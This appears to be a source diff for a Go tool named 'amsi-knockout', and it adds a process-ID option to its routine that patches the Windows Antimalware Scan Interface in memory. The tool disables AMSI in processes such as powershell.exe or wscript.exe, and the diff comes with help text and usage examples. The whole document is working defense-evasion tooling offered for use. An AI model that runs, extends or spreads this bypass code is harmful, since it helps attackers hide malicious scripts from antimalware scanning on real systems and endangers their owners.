@@ -28,8 +28,9 @@ var patch = []byte{0xEB}
 
 // Bypasses AMSI 
 // processName: String which holds the name of the process to patch
+// pid: Integer which holds the ID of the process to patch
 // Returns nothing (void)
-func AMSIBypass(processName string) {
+func AMSIBypass(processName string, pid int) {
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
 		fmt.Println("[!] Error creating snapshot:", err)
@@ -46,19 +47,35 @@ func AMSIBypass(processName string) {
 		return
 	}
 
+	patched := false
 	for {
+		// Patch AMSI based on given process name
 		exeFile := windows.UTF16ToString(entry.ExeFile[:])
-		if exeFile == processName {
+		if pid == 0 && exeFile == processName {
 			if bypassProcess(entry.ProcessID) {
 				fmt.Printf("[+] AMSI patched %d\n", entry.ProcessID)
-			} else {
-				fmt.Println("[!] Patch failed")
+				patched = true
 			}
 		}
+
+		// Patch AMSI based on given PID
+		if pid != 0 && pid == int(entry.ProcessID) {
+			if bypassProcess(entry.ProcessID) {
+				fmt.Printf("[+] AMSI patched %d\n", entry.ProcessID)
+				patched = true
+			}
+			// We want just to patch one specific PID
+			break
+		}
+
 		err = windows.Process32Next(snapshot, &entry)
 		if err != nil {
 			break
 		}
+	}
+
+	if !patched {
+		fmt.Println("[!] Patching failed!")
 	}
 }
 
@@ -150,14 +167,16 @@ func init() {
 
 		h += "Options:\n"
 		h += "  --help          Print help/usage informations\n"
-		h += "  --processName   Process name where AMSI will be bypassed,DEFAULT: 'subdomains'\n"
+		h += "  --processName   Process name where AMSI will be bypassed\n"
 		h += "                  DEFAULT: 'powershell.exe', POSSIBLE VALUES: pwsh.exe, powershell.exe, wscript.exe or cscript.exe\n"
+		h += "  --pid   		Process ID where AMSI will be bypassed\n"
 		h += "\n"
 
 		h += "Examples:\n"
 		h += "  amsi-knockout.exe\n"
 		h += "  amsi-knockout.exe --processName 'powershell.exe'\n"
 		h += "  amsi-knockout.exe --processName 'wscript.exe'\n"
+		h += "  amsi-knockout.exe --pid 2345\n"
 		h += "  amsi-knockout.exe --help\n"
 		h += "  amsi-knockout.exe --version\n"
 
@@ -166,14 +185,18 @@ func init() {
 }
 
 func main() {
-	// Defining available flags
+	// Defining and parsing flags
 	processName := flag.String("processName", "powershell.exe", "Name of the process to search and bypass AMSI")
-
-	// Parse all falgs
+	pid := flag.Int("pid", 0, "Process ID of the process to search and bypass AMSI")
 	flag.Parse()
 
-	fmt.Println("[i] Try to bypass AMSI ...")
-	fmt.Println("[i] Processname:", *processName)
+	if *pid == 0 {
+		fmt.Println("[i] Processname:", *processName)
+	}
 
-	AMSIBypass(*processName);
+	if *pid != 0 {
+		fmt.Println("[i] PID:", *pid)
+	}
+
+	AMSIBypass(*processName, *pid);
 }
